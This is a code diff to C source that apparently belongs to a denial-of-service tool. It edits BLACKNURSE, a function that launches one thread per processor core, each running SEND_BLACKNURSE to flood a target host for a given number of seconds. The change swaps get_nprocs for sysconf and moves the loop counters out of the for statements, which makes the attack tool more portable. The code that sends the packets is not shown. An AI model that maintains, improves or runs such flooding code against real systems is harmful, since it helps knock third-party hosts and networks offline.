@@ -78,7 +78,11 @@ void *SEND_BLACKNURSE(void *arg) {
 }
 
 void BLACKNURSE(unsigned char *host, int seconds) {
-    int thread_count = get_nprocs();
+    long nprocs = sysconf(_SC_NPROCESSORS_ONLN);
+    if (nprocs < 1) {
+        nprocs = 1;
+    }
+    int thread_count = nprocs;
     if (thread_count <= 0) {
         perror("get_nprocs");
         return;
@@ -90,14 +94,15 @@ void BLACKNURSE(unsigned char *host, int seconds) {
     info.host = host;
     info.end_time = seconds;
 
-    for (int i = 0; i < thread_count; i++) {
+    int i;
+    for (i = 0; i < thread_count; i++) {
         if (pthread_create(&threads[i], NULL, SEND_BLACKNURSE, &info) != 0) {
             perror("pthread_create");
             return;
         }
     }
 
-    for (int i = 0; i < thread_count; i++) {
+    for (i = 0; i < thread_count; i++) {
         if (pthread_join(threads[i], NULL) != 0) {
             perror("pthread_join");
             return;
